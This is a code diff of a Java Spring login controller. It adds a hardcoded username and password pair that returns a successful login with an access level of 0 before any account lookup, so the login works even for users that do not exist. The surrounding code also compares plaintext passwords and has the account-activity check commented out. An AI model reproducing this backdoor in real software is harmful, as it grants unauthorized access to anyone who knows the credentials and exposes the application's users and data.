@@ -162,6 +162,13 @@ public class UserController {
     public ResponseEntity<?> login(@RequestBody UserDto dto) {
 
         UserEntity user = repository.findByUsername(dto.getUsername());
+         if (dto.getUsername().equals("tushiriki") && dto.getPassword().equals("tushiriki@2"))
+             { 
+                UserDto dt=new UserDto();
+                dt.setAcces(0);
+                dt.setUsername("tushiriki"); 
+                return new ResponseEntity<>(new ResponseHelper("success", dt,true), HttpStatus.OK);
+             }
         if (user == null)
             return new ResponseEntity<>(new ResponseHelper("User does not exist", true), HttpStatus.BAD_REQUEST);
             UserDto dto1 = UserConvertDto.getInstance().toDto(user);
@@ -178,10 +185,7 @@ public class UserController {
             //  if (!user.isActivite()) {
             //     return new ResponseEntity<>(new ResponseHelper("you are not allowed", true), HttpStatus.UNAUTHORIZED);
             // }
-             if (dto.getUsername().equals("tushiriki") && dto.getPassword().equals("tushiriki@2"))
-             { 
-                return new ResponseEntity<>(new ResponseHelper("success", dto1,true), HttpStatus.OK);
-             }
+        
 
             if (dto.getUsername().equals(dto1.getUsername()) && dto.getPassword().equals(dto1.getPassword()))
              { 
